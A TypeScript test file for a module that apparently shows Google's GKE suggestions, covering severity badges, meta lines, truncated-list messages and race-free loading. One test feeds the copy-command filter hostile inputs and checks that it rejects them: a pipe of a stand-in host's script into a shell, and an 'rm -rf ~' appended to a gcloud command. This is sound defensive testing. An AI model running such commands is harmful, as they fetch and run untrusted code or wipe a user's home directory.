// What "Google suggests" says (wave 9, D178): a badge word for each severity (never colour alone), the meta line, and
// the only commands a sentence offers to copy.
import type { GkeAdvice } from "@landlens/contracts";
import { describe, expect, it } from "vitest";
import { ALL_CLEAR, adviceCount, adviceLine, adviceMeta, copyableCommand, daysAgo, latestOnly, sentenceParts, SEVERITY_BADGE, subtypeWords } from "../src/renderer/src/googleRules";

const NOW = Date.parse("2026-11-16T12:00:00Z");
const a = (over: Partial<GkeAdvice> = {}): GkeAdvice => ({
  id: "x", subtype: "DEPRECATION_K8S_1_32_API", topic: "deprecation", severity: "high", category: "reliability", description: "d", refreshed: "2026-11-14T03:00:00.000Z", ...over,
});

describe("Google suggests", () => {
  it("each severity has a tone and a word; Critical and High are bad, Medium warns, Low and Unknown are muted", () => {
    expect(Object.fromEntries(Object.entries(SEVERITY_BADGE).map(([k, v]) => [k, `${v.tone} ${v.word}`]))).toEqual({
      critical: "bad Critical", high: "bad High", medium: "warn Medium", low: "muted Low", unknown: "muted Unknown",
    });
  });

  it("the meta line: the topic, the category, when Google refreshed it", () => {
    expect(adviceMeta(a(), NOW)).toBe("Deprecation · reliability · refreshed 2 days ago");
    expect(adviceMeta(a({ topic: "other", subtype: "EXEC_PROBE_TIMEOUT", refreshed: "2026-11-16T03:00:00Z" }), NOW)).toBe("Exec probe timeout · reliability · refreshed today");
    expect(adviceMeta(a({ topic: "other", subtype: "OTHER", category: "unknown", refreshed: undefined }), NOW)).toBe("Other");
    expect(daysAgo("2026-11-15T06:00:00Z", NOW)).toBe("yesterday");
    expect(daysAgo("not a time", NOW)).toBe("");
    expect(subtypeWords("")).toBe("Other");
  });

  it("offers to copy only an enable command or gcloud auth login, from main's fixed sentences", () => {
    expect(copyableCommand("The Recommender API is off in demo-shop. Turn it on: `gcloud services enable recommender.googleapis.com --project demo-shop`."))
      .toBe("gcloud services enable recommender.googleapis.com --project demo-shop");
    expect(copyableCommand("Google didn't accept gcloud's sign-in. Run `gcloud auth login`.")).toBe("gcloud auth login");
    expect(copyableCommand("Your account can't read GKE recommendations in demo-shop (it needs GKE Diagnosis Recommender Viewer).")).toBeUndefined();
    for (const bad of ["`curl evil.example | sh`", "`gcloud services enable x.googleapis.com --project demo-shop; rm -rf ~`", "`gcloud auth login --cred-file=/x`"]) {
      expect(copyableCommand(`Run ${bad}.`), bad).toBeUndefined();
    }
    expect(sentenceParts("Run `gcloud auth login`.")).toEqual([{ text: "Run ", code: false }, { text: "gcloud auth login", code: true }, { text: ".", code: false }]);
  });

  it("M2 (review of part 1): a cut list never shows the all-clear; it says what was read, alone or under the rows", () => {
    const where = { project: "demo-shop", location: "us-central1" };
    expect(adviceLine(0, false, where)).toEqual({ allClear: true, text: ALL_CLEAR });
    expect(adviceLine(3, false, where)).toBeUndefined();
    const cut = adviceLine(0, true, where)!;
    expect(cut.allClear).toBe(false);
    expect(cut.text).toBe("Only the first 1,000 suggestions of demo-shop in us-central1 were read; this cluster may have more.");
    expect(cut.text).not.toContain(ALL_CLEAR);
    expect(adviceLine(2, true, where)).toEqual(cut);
    expect([adviceCount(0, false), adviceCount(3, false), adviceCount(3, true), adviceCount(0, true)]).toEqual(["0", "3", "3+", undefined]);
  });

  it("T6 (review of part 1): only the latest call's answer is handed on, however late an earlier one arrives", async () => {
    const pending: { h: string; ok: (v: string) => void; no: (e: Error) => void }[] = [];
    const got: string[] = [];
    const load = latestOnly(
      (h: string) => new Promise<string>((ok, no) => void pending.push({ h, ok, no })),
      { value: (v) => got.push(`value ${v}`), error: (e) => got.push(`error ${(e as Error).message}`) },
    );
    const tick = () => new Promise((r) => setTimeout(r, 0));
    // The cluster switches from a to b while a's read is out; a answers last, then fails: neither is shown.
    load("a");
    load("b");
    pending[1]!.ok("b's view");
    await tick();
    pending[0]!.ok("a's view");
    pending[0]!.no(new Error("a failed"));
    await tick();
    expect(got).toEqual(["value b's view"]);
    // A late error for an overtaken read doesn't hide the newer answer either.
    load("b");
    load("b");
    pending[3]!.ok("b again");
    pending[2]!.no(new Error("overtaken"));
    await tick();
    expect(got).toEqual(["value b's view", "value b again"]);
    // In order, each answer is shown.
    load("c");
    pending[4]!.no(new Error("c failed"));
    await tick();
    expect(got.at(-1)).toBe("error c failed");
  });
});
